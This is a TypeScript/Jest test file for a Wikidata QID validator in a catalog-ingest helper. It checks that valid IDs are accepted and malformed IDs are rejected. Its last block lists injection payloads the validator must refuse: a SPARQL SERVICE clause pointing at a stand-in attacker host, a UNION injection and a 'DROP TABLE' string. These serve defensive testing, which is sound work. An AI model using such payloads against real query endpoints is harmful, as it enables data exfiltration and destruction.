const helpers = require('../../../scripts/catalog-ingest.helpers') as {
  validateWikidataQid: (s: string) => boolean;
};

describe('catalog-ingest.helpers — validateWikidataQid (TD-SEC-WAVEA-01)', () => {
  describe('canonical accepts — `^Q[1-9][0-9]{0,18}$`', () => {
    it('accepts Q1773424 (Pont de Pierre, Bordeaux)', () => {
      expect(helpers.validateWikidataQid('Q1773424')).toBe(true);
    });

    it("accepts Q3329534 (Musée d'Aquitaine)", () => {
      expect(helpers.validateWikidataQid('Q3329534')).toBe(true);
    });

    it('accepts Q19652 (public-domain license entity)', () => {
      expect(helpers.validateWikidataQid('Q19652')).toBe(true);
    });

    it('accepts Q1 (smallest legal Qid)', () => {
      expect(helpers.validateWikidataQid('Q1')).toBe(true);
    });
  });

  describe('rejects — empty / malformed', () => {
    it('rejects the empty string', () => {
      expect(helpers.validateWikidataQid('')).toBe(false);
    });

    it('rejects a lone `Q` with no digits', () => {
      expect(helpers.validateWikidataQid('Q')).toBe(false);
    });

    it('rejects `Q0` (Wikidata Qids start at Q1)', () => {
      expect(helpers.validateWikidataQid('Q0')).toBe(false);
    });

    it('rejects `Q01` (leading zero)', () => {
      expect(helpers.validateWikidataQid('Q01')).toBe(false);
    });

    it('rejects `q19652` (lowercase prefix)', () => {
      expect(helpers.validateWikidataQid('q19652')).toBe(false);
    });

    it('rejects `42abc` (no `Q` prefix)', () => {
      expect(helpers.validateWikidataQid('42abc')).toBe(false);
    });

    it('rejects a string with leading whitespace', () => {
      expect(helpers.validateWikidataQid('  Q1773424')).toBe(false);
    });

    it('rejects a string with an embedded newline', () => {
      expect(helpers.validateWikidataQid('Q1773424\n')).toBe(false);
    });

    it('rejects a Qid with more than 19 digits (overflow guard)', () => {
      expect(helpers.validateWikidataQid('Q123456789012345678901')).toBe(false);
    });
  });

  describe('rejects — SPARQL injection payloads (defense-in-depth, WAVE-A-SEC-M1)', () => {
    it('rejects a SERVICE-injection payload', () => {
      expect(
        helpers.validateWikidataQid('Q1.} SERVICE <http://attacker.example/sparql> { ?a ?b ?c } #'),
      ).toBe(false);
    });

    it('rejects a UNION-injection payload', () => {
      expect(helpers.validateWikidataQid('Q1773424 UNION SELECT')).toBe(false);
    });

    it('rejects a SQL-style `DROP TABLE` payload (defense-in-depth)', () => {
      expect(helpers.validateWikidataQid('Q1773424; DROP TABLE--')).toBe(false);
    });
  });
});
